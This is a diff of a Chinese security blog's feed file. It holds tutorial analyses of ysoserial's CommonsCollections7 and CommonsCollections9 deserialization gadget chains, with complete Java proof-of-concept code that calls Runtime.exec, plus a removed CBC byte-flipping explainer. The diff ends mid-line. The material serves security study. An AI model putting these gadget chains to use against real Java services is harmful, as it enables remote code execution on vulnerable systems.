@@ -117,61 +117,6 @@
       </categories>
   </entry>
   <entry>
-    <title>CBC字节翻转攻击</title>
-    <url>/2020/05/08/cbc-reverse/</url>
-    <content><![CDATA[<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时为了保证保证即使对相同明文多次加密，也可以得到不同的密文，在第一个块中使用<font color=#008000>IV(初始化向量)</font>。当获取到一组明文与其对应的IV，密文时，即可发起CBC字节翻转攻击。</p>
-<a id="more"></a>
-
-<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p><strong>加密过程如下所示</strong>:</p>
-<p><img src="1.png" alt=""></p>
-<p>文字版的加密过程：</p>
-<ol>
-<li>首先将明文分组(常见于以16字节一组)，位数不足进行填充。</li>
-<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
-<li>将IV和第一组明文异或。</li>
-<li>用密钥对异或的结果使用密钥key进行加密，得到密文C1。</li>
-<li>使用C1与第二组明文进行异或，然后使用key加密，得到密文C2。</li>
-<li>重复4-5,直到最后一组明文。</li>
-<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
-</ol>
-<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p><strong>解密过程如下所示</strong>:</p>
-<p><img src="2.png" alt=""></p>
-<p>文字版的解密过程：</p>
-<ol>
-<li>从密文中提取出IV，然后将密文分组。</li>
-<li>使用密钥key对第一组密文进行解密，然后和IV进行异或得到第一组明文。</li>
-<li>使用key对第二组密文进行解密，然后和第一组密文进行异或得到第二组明文。</li>
-<li>重复3，直到最后一组密文。</li>
-</ol>
-<h1 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h1><p><strong>CBC翻转攻击原理</strong>:</p>
-<p>而CBC翻转攻击与解密过程有关。直观来看，IV会影响到第一组明文的值，而每一组明文的值都会被前一组密文所影响。若第一块密文中的某个字节被改变，则解密出来的第二组明文对应的字节也会被改变。可以从下图看出这整个过程</p>
-<p><img src="3.png" alt=""></p>
-<p>可以得知，某组密文的改变会影响到其对应的明文块的<font color=#008000>完全改变</font>以及下一个明文块中<font color=#008000>对应位置的改变</font>。</p>
-<p>此攻击造成的影响:</p>
-<ol>
-<li>绕过过滤器</li>
-<li>改变用户权限提升至管理员</li>
-<li>…</li>
-</ol>
-<p><strong>CBC翻转攻击过程</strong></p>
-<p>具体的如何改变明文呢？假设要改变第二组明文的值，那么就需要改变对应的第一组密文的值。这里就要利用到异或的原理，若<code>A = B XOR C</code>，那么<font color=#008000><code>A XOR B XOR C = 0</code></font>。所以，<code>0 XOR ANY = ANY</code>。假设ANY为最终我们想要改变的明文字节值。 有如下的计算方式:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P[1] &#x3D; decrept(C[1]) XOR IV</span><br><span class="line">P[2] &#x3D; decrept(C[2]) XOR C[1]</span><br><span class="line"></span><br><span class="line">ANY &#x3D; P[2] XOR decrept(C[2]) XOR C[1] XOR ANY</span><br><span class="line"></span><br><span class="line">ANY &#x3D; decrept(C[2]) XOR (P[2] XOR C[1] XOR ANY)</span><br><span class="line">C&#39;[1] &#x3D; P[2] XOR C[1] XOR ANY</span><br></pre></td></tr></table></figure>
-
-<p>由上述可知，改变的密文字节值的计算方式为<font color=#008000><code>P[2] XOR C[1] XOR ANY</code></font>。python中使用如下方式进行计算</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(ord(C[<span class="number">1</span>])^ord(P[<span class="number">2</span>])^ord(ANY))</span><br></pre></td></tr></table></figure>
-
-<p>对应的明文确实如期地改变了，但由于密文C[1]的变化，使得明文P[1]的结果也面目全非。而明文P[1]的结果与IV相关，IV为我们可控。因此按照同样的方法改变IV的值，最终就得到了更改后的密文和IV。</p>
-<p>对此感兴趣的同学可以<a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">p0’s</a>师傅出得一道题来看看。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://maplege.github.io/2018/11/19/CBC-reverse/" target="_blank" rel="noopener">CBC字节反转攻击原理</a></li>
-<li><a href="https://p0sec.net/index.php/archives/99/" target="_blank" rel="noopener">CBC字节翻转攻击</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>密码攻击</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Apache Commons Collections分析</title>
     <url>/2020/04/20/common-collections/</url>
     <content><![CDATA[<h1 id="Apache-Commons-Collections介绍"><a href="#Apache-Commons-Collections介绍" class="headerlink" title="Apache Commons Collections介绍"></a>Apache Commons Collections介绍</h1><p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。</p>
@@ -656,6 +601,51 @@
       </categories>
   </entry>
   <entry>
+    <title>ysoserial分析之CommonsCollections7</title>
+    <url>/2020/04/27/ysoserial-analyze-7/</url>
+    <content><![CDATA[<p>这篇文章分析的CommonsCollections7。这篇文章主要介绍了利用<font color=#008000>Hash碰撞</font>的方式来触发LazyMap.get函数，从而调用到transform函数，执行任意命令。</p>
+<a id="more"></a>
+
+<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a>  </p>
+<p>CommonsCollections7与前面的CommonsCollections5，6的不同点挺多的。它使用了<code>hash碰撞</code>的方式来触发LazyMap.get函数。而在最外层使用的是<code>Hashtable</code>来触发其readObject函数。它整个的利用链如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">  -&gt;HashTable.reconstitutionPut()</span><br><span class="line">  	-&gt;AbstractMapDecorator.equals()</span><br><span class="line">  	  -&gt;AbstractMap.equals()</span><br><span class="line">  	    -&gt;LazyMap.get()</span><br><span class="line">  	      -&gt;ChainedTransformer.transform()</span><br><span class="line">  	        -&gt;ConstantTransformer.transform()</span><br><span class="line">  	        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于从LazyMap.get到最后的整个过程之前都已经分析过。这里我们就分析LazyMap.get往前的利用链。</p>
+<p>考虑到需要触发LazyMap.get函数，根据以往的想法，需要找到一个具有这样条件的类：1）该类可以被反序列化。2）该类调用了LazyMap.get()或者Map.get()或者Object。get()。但是这条利用链比较特殊，它用到了hash碰撞。我们从头开始分析，首先定位到HashTable的readObject函数。</p>
+<p><img src="1.png" alt=""></p>
+<p>可以看到在最后有一个<code>reconstitutionPut</code>函数。跟进这个函数</p>
+<p><img src="2.png" alt=""></p>
+<p>该函数收看会填充table的内容，然后在if判断中，首先<code>e.hash==hash</code>为真，才会进入<code>e.key.equals(key)</code>的判断。跟进equals，这里的equals函数取决于key的类型，在利用链中利用的是LazyMap对象，它调用的其父类AbstractMapDecorator的equals函数。</p>
+<p><img src="3.png" alt=""></p>
+<p>在这个equals函数中，又调用了map的equals函数，这里实际调用的是HashMap的父类<code>AbstractMap</code>的equals函数。跟进这个equals函数，可以发现在里面调用了<code>m.get(key)</code>。此时只需要让m为LazyMap对象即可。</p>
+<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>从Hashtables.readObject函数中进入reconstitutionPut，这个函数中会在<code>tab</code>中存入<code>&lt;key,value&gt;</code>的entry，它会通过hash计算当前存放的entry在tab中的位置，若key的hash值一样，那么位置就一样，就会进入if判断。这时候会先比较下一个entry与当前key的hash值是否一样，若一致，则进入<code>e.key.equals(key)</code>。</p>
+<p>那么首先就需要解决如何进入<code>e.key.equals(key)</code>。在Hashtable中放入2个entry，其key是一致的。进而进入<code>e.key.equals(key)</code>。这里选择放置两个LazyMap对象作为key。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">lazymap2.put(<span class="string">"zz"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazymap2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<p>进入equals函数，进一步分析为什么放入的是这样的key。此时的key作为参数传入了equals函数。由于<code>e.key</code>是一个lazyMap，应该调用的是LazyMap的equals函数，而LazyMap继承了AbstractMapDecorator类且并未重写equals函数，因此调用的是<code>AbstractMapDecorator</code>类的equals函数。</p>
+<p>但是从AbstractMapDecorator类的equals函数接着就调用到了AbstractMap类的equals函数不是很能理解，猜测可能是因为AbstractMapDecorator是AbstractMap类的一个装饰类，因此调用的是AbstractMap类的equals方法。它会首先判断传入的key是否是AbstractMapDecorator实例，不是则调用AbstractMap类的equals方法。  </p>
+<p>进入AbstractMap的equals方法。同样传入的参数是一开始的key，这个key会转化为一个Map类型对象m。这个m在接下来调用了<code>m.get(key)</code>。在利用链中可以知道，这个m必须为LazyMap对象，即前面的Hashtable的entry中的key是LazyMap对象。</p>
+<p><img src="5.png" alt=""></p>
+<p>在这里需要满足两个Lazymap对象的size是一致的，且这里需要满足value不为null，才能调用到<code>m.get(key)</code>。看起来似乎就是满足的。事实上，查看ysoserial的payload，可以发现有如下操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(&quot;yy&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这里是因为Hashtable在放入第二个LazyMap时，由于两个hash值相同，继续调用到LazyMap.get的时候。会将第一个LazyMap的key，value值放入第二个中。</p>
+<p><img src="6.png" alt=""></p>
+<p>到这里整个payload构造完毕，完整的demo如下所示:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">        lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">        lazymap2.put(<span class="string">"zZ"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazymap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        lazymap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下:</p>
+<p><img src="7.png" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
+<li><a href="https://www.cnblogs.com/tr1ple/p/12427015.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(7)</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ysoserial分析之CommonsCollections8</title>
     <url>/2020/04/28/ysoserial-analyze-8/</url>
     <content><![CDATA[<p>这篇文章分析的是CommonsCollections8。它是2019年<code>navalorenzo</code>推动到ysoserial上的。CommonsCollections8利用的是commonscollections:4.0版本。这条利用链与CommonsCollections2，4比较相似，不同的是适用了新的readObject触发点<font color=#008000><code>TreeBag</code></font>。</p>
@@ -699,44 +689,33 @@
       </categories>
   </entry>
   <entry>
-    <title>ysoserial分析之CommonsCollections7</title>
-    <url>/2020/04/27/ysoserial-analyze-7/</url>
-    <content><![CDATA[<p>这篇文章分析的CommonsCollections7。这篇文章主要介绍了利用<font color=#008000>Hash碰撞</font>的方式来触发LazyMap.get函数，从而调用到transform函数，执行任意命令。</p>
+    <title>ysoserial分析之CommonsCollections9</title>
+    <url>/2020/04/28/ysoserial-analyze-9/</url>
+    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
 <a id="more"></a>
 
-<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a>  </p>
-<p>CommonsCollections7与前面的CommonsCollections5，6的不同点挺多的。它使用了<code>hash碰撞</code>的方式来触发LazyMap.get函数。而在最外层使用的是<code>Hashtable</code>来触发其readObject函数。它整个的利用链如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">  -&gt;HashTable.reconstitutionPut()</span><br><span class="line">  	-&gt;AbstractMapDecorator.equals()</span><br><span class="line">  	  -&gt;AbstractMap.equals()</span><br><span class="line">  	    -&gt;LazyMap.get()</span><br><span class="line">  	      -&gt;ChainedTransformer.transform()</span><br><span class="line">  	        -&gt;ConstantTransformer.transform()</span><br><span class="line">  	        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
+<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>commonscollections:3.2.1</li>
+<li>未配置security-manager</li>
+</ul>
+<p>先来看看整个的利用链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
 
-<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于从LazyMap.get到最后的整个过程之前都已经分析过。这里我们就分析LazyMap.get往前的利用链。</p>
-<p>考虑到需要触发LazyMap.get函数，根据以往的想法，需要找到一个具有这样条件的类：1）该类可以被反序列化。2）该类调用了LazyMap.get()或者Map.get()或者Object。get()。但是这条利用链比较特殊，它用到了hash碰撞。我们从头开始分析，首先定位到HashTable的readObject函数。</p>
+<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
 <p><img src="1.png" alt=""></p>
-<p>可以看到在最后有一个<code>reconstitutionPut</code>函数。跟进这个函数</p>
+<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>
+
+<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行的结果如下所示:</p>
 <p><img src="2.png" alt=""></p>
-<p>该函数收看会填充table的内容，然后在if判断中，首先<code>e.hash==hash</code>为真，才会进入<code>e.key.equals(key)</code>的判断。跟进equals，这里的equals函数取决于key的类型，在利用链中利用的是LazyMap对象，它调用的其父类AbstractMapDecorator的equals函数。</p>
-<p><img src="3.png" alt=""></p>
-<p>在这个equals函数中，又调用了map的equals函数，这里实际调用的是HashMap的父类<code>AbstractMap</code>的equals函数。跟进这个equals函数，可以发现在里面调用了<code>m.get(key)</code>。此时只需要让m为LazyMap对象即可。</p>
-<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>从Hashtables.readObject函数中进入reconstitutionPut，这个函数中会在<code>tab</code>中存入<code>&lt;key,value&gt;</code>的entry，它会通过hash计算当前存放的entry在tab中的位置，若key的hash值一样，那么位置就一样，就会进入if判断。这时候会先比较下一个entry与当前key的hash值是否一样，若一致，则进入<code>e.key.equals(key)</code>。</p>
-<p>那么首先就需要解决如何进入<code>e.key.equals(key)</code>。在Hashtable中放入2个entry，其key是一致的。进而进入<code>e.key.equals(key)</code>。这里选择放置两个LazyMap对象作为key。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">lazymap2.put(<span class="string">"zz"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazymap2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
-
-<p>进入equals函数，进一步分析为什么放入的是这样的key。此时的key作为参数传入了equals函数。由于<code>e.key</code>是一个lazyMap，应该调用的是LazyMap的equals函数，而LazyMap继承了AbstractMapDecorator类且并未重写equals函数，因此调用的是<code>AbstractMapDecorator</code>类的equals函数。</p>
-<p>但是从AbstractMapDecorator类的equals函数接着就调用到了AbstractMap类的equals函数不是很能理解，猜测可能是因为AbstractMapDecorator是AbstractMap类的一个装饰类，因此调用的是AbstractMap类的equals方法。它会首先判断传入的key是否是AbstractMapDecorator实例，不是则调用AbstractMap类的equals方法。  </p>
-<p>进入AbstractMap的equals方法。同样传入的参数是一开始的key，这个key会转化为一个Map类型对象m。这个m在接下来调用了<code>m.get(key)</code>。在利用链中可以知道，这个m必须为LazyMap对象，即前面的Hashtable的entry中的key是LazyMap对象。</p>
-<p><img src="5.png" alt=""></p>
-<p>在这里需要满足两个Lazymap对象的size是一致的，且这里需要满足value不为null，才能调用到<code>m.get(key)</code>。看起来似乎就是满足的。事实上，查看ysoserial的payload，可以发现有如下操作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(&quot;yy&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>这里是因为Hashtable在放入第二个LazyMap时，由于两个hash值相同，继续调用到LazyMap.get的时候。会将第一个LazyMap的key，value值放入第二个中。</p>
-<p><img src="6.png" alt=""></p>
-<p>到这里整个payload构造完毕，完整的demo如下所示:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new 